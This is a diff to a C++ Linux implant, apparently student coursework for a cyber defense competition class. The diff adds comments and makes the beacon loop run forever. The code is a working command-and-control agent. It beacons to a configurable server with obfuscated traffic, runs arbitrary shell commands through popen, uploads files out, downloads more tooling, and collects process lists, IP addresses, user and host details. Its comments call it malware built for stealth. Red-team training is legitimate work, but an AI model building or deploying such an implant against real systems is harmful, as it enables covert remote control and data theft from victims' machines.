@@ -27,7 +27,14 @@
 #include <sys/socket.h>
 typedef unsigned int UINT;
 
+/*
+Jake McLellan
+CSEC 473 - CDT
+Linux Implant
+*/
 
+
+// Structure used for containing URL endpoint data. Useful if I decide to rotate them for stealth.
 struct Endpoints {
   std::string heartbeat;
   std::string info;
@@ -35,6 +42,8 @@ struct Endpoints {
   std::string ps;
   std::string upload;
 };
+
+// Structure containing important configuration details. Will allow for eventual conig file loading.
 struct Configuration {
   std::string useragent;
   std::string cookiejarfile;
@@ -54,12 +63,14 @@ struct Configuration {
 };
 
 
+// Used by libcurl to write HTTP response data into a std::string
 static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
     ((std::string*)userp)->append((char*)contents, size * nmemb);
     return size * nmemb;
 }
 
 
+// Encoding method used to obfuscate traffic
 std::string encode(std::string key, std::string clear) {
   std::string enc = "";
   char key_c;
@@ -76,6 +87,7 @@ std::string encode(std::string key, std::string clear) {
 }
 
 
+// Decoding method used to deobfuscate incoming traffic
 std::string decode(std::string key, std::string enc) {
   std::string dec = "";
   char key_c;
@@ -91,6 +103,8 @@ std::string decode(std::string key, std::string enc) {
   return dec;
 }
 
+
+// Used by libcurl to download data via HTTP GET request and save to file
 static size_t write_data_to_file(void *ptr, size_t size, size_t nmemb, void *stream)
 {
   size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
@@ -98,13 +112,13 @@ static size_t write_data_to_file(void *ptr, size_t size, size_t nmemb, void *str
 }
 
 
+// Uploads file specified by filepath to the /upload endpoint via HTTP POST
 void uploadfile(Configuration c, std::string filepath) {
   CURL *curl;
   CURLcode res;
 
   curl_mime *form = NULL;
   curl_mimepart *field = NULL;
-  struct curl_slist *headerlist = NULL;
 
   curl = curl_easy_init();
   if(curl) {
@@ -117,9 +131,6 @@ void uploadfile(Configuration c, std::string filepath) {
     curl_mime_name(field, "file");
     curl_mime_filedata(field, filepath.c_str());
 
-
-    /* initialize custom header list (stating that Expect: 100-continue is not
-       wanted */
     /* what URL that receives this POST */
     curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
@@ -141,13 +152,13 @@ void uploadfile(Configuration c, std::string filepath) {
 }
 
 
+// Doanload file at {URL} to {PATH}. Useful for deploying scripts and additional tooling
 void downloadFile(std::string url, std::string path){
   CURL *curl_handle;
   FILE *pagefile;
 
   /* init the curl session */
   curl_handle = curl_easy_init();
-
   /* set URL to get here */
   curl_easy_setopt(curl_handle, CURLOPT_URL, url.c_str());
   curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
@@ -158,7 +169,6 @@ void downloadFile(std::string url, std::string path){
   /* open the file */
   pagefile = fopen(path.c_str(), "wb");
   if(pagefile) {
-
     /* write the page body to this file handle */
     curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);
 
@@ -168,13 +178,12 @@ void downloadFile(std::string url, std::string path){
     /* close the header file */
     fclose(pagefile);
   }
-
   /* cleanup curl stuff */
   curl_easy_cleanup(curl_handle);
 }
 
 
-
+// Encodes data and sends it to /{endpoint}. Returns HTTP response as string.
 std::string send_enc(Configuration c, std::string data, std::string endpoint){
   std::string url = c.protocol + "://" + c.hostname + ":" + std::to_string(c.port) + endpoint;
   curl_easy_setopt(c.curl, CURLOPT_URL, url.c_str());
@@ -184,6 +193,7 @@ std::string send_enc(Configuration c, std::string data, std::string endpoint){
   curl_easy_setopt(c.curl, CURLOPT_POSTFIELDSIZE, result.length());
   curl_easy_setopt(c.curl, CURLOPT_POSTFIELDS, result.c_str());
   CURLcode res = curl_easy_perform(c.curl);
+
   std::string returnStr = c.readbuffer;
 
   //reset values and return
@@ -198,13 +208,12 @@ std::string send_enc(Configuration c, std::string data, std::string endpoint){
 }
 
 
+// Executes {cmd} and returns string output. Uses timeout to ensure that infinite commands cannot hang.
 std::string exec(const char* cmd, int timeout) {
     std::array<char, 128> buffer;
     std::string result;
     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
     std::time_t starttime = std::time(nullptr);
-    std::cout << starttime << std::endl;
-    std::cout << starttime + timeout << std::endl;
     if (!pipe) {
         throw std::runtime_error("popen() failed!");
     }
@@ -218,6 +227,7 @@ std::string exec(const char* cmd, int timeout) {
 }
 
 
+// Used when getting currently running processes to convert PIDs into process names. May not always be available.
 std::string getProcessName(std::string pid) {
   std::string outName = "";
   std::string filename = "/proc/" + pid;
@@ -236,9 +246,10 @@ std::string getProcessName(std::string pid) {
   return outName;
 }
 
+
+// Filter /proc/ to ensure that only process directories are examined
 int filter(const struct dirent *dir)
 {
-     uid_t user;
      struct stat dirinfo;
      int len = strlen(dir->d_name) + 7;
      char path[len];
@@ -254,6 +265,7 @@ int filter(const struct dirent *dir)
 }
 
 
+// Returns string of all currently running processes. String in format PID1:NAME1&PID2:NAME2&...
 std::string processdir()
 {
   std::string outstr = "";
@@ -276,6 +288,7 @@ std::string processdir()
 }
 
 
+// Returns string of all interface IP addresses split by comma
 std::string getIPAddresses(){
   struct ifaddrs *ifaddr;
   int family, s;
@@ -310,32 +323,8 @@ std::string getIPAddresses(){
   return out;
 }
 
-/*
-std::string getPublicIP(Configuration c) {
-  std::string ip = "";
-  c.readbuffer.clear();
-  curl_easy_setopt(c.curl, CURLOPT_URL, c.ipCheckUrl.c_str());
-  curl_easy_setopt(c.curl, CURLOPT_HTTPGET, 1);
-  curl_easy_setopt(c.curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-  curl_easy_setopt(c.curl, CURLOPT_WRITEDATA, &c.readbuffer);
-  CURLcode res = curl_easy_perform(c.curl);
-  if(res != CURLE_OK)
-        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-  ip = c.readbuffer;
 
-  //reset values and return
-  c.readbuffer.clear();
-  c.postfields = "";
-  std::string url = c.protocol + "://" + c.hostname + ":" + std::to_string(c.port) + c.endpoints.heartbeat;
-  curl_easy_setopt(c.curl, CURLOPT_POST, 1);
-  curl_easy_setopt(c.curl, CURLOPT_URL, url.c_str());
-  curl_easy_setopt(c.curl, CURLOPT_POSTFIELDS, c.postfields.c_str());
-  curl_easy_setopt(c.curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-  curl_easy_setopt(c.curl, CURLOPT_WRITEDATA, &c.readbuffer);
-  return ip;
-}
-*/
-
+// Gathers all OS info and adds to output string. Includes IP info, username, hostname, OS version, and memory amount.
 std::string gatherSystemInfo(Configuration c){
   std::string out = "";
   std::string publicIP = "-";
@@ -366,6 +355,8 @@ std::string gatherSystemInfo(Configuration c){
   return out;
 }
 
+
+// Contains main malware code + loop
 int main(void)
 {
   CURL *curl;
@@ -401,9 +392,7 @@ int main(void)
 		switch atoi(action code)
     */
 
-
-    int i = 0;
-    while(i < 10){
+    while(1){
       res = curl_easy_perform(c.curl);
       /* Check for errors */
       if(res != CURLE_OK)
@@ -455,7 +444,6 @@ int main(void)
       }
       c.readbuffer.clear();
       sleep(c.sleeptime);
-      i++;
     }
     curl_slist_free_all(list);
     curl_easy_cleanup(c.curl);
